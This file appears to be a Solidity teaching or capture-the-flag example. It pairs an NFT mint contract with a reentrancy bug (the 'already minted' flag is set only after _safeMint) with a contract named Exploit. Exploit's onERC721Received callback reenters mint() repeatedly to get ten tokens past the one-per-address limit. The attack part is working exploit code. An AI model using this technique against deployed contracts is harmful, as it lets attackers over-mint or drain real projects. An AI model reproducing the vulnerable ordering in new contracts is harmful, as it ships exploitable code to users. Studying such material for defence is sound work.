pragma solidity 0.8.19;


import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract ISpaceNFT is ERC721 {
    uint256 public constant PRICE = 1 ether;
    mapping(address => bool) public minted; 
    uint256 public supply;

    error InvalidPrice();
    error AlreadyMinted();

    constructor() ERC721("SNFT", "SpaceNFT") { }

    function mint() external payable {
        if(msg.value != PRICE) revert InvalidPrice();
        if(minted[msg.sender]) revert AlreadyMinted();

        _safeMint(msg.sender, ++supply);
        minted[msg.sender] = true;
    }
}


contract Exploit is IERC721Receiver {
    ISpaceNFT spaceNFT;
    uint256 num = 0;
    constructor(address spaceNFTAddress) payable {
        spaceNFT = ISpaceNFT(spaceNFTAddress);
    }

    function attack() external {
        spaceNFT.mint{value: 1 ether}();
    }
   
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        while(num < 9){
            num++;
            spaceNFT.mint{value: 1 ether}();
        }
        
        return IERC721Receiver.onERC721Received.selector;
    }
}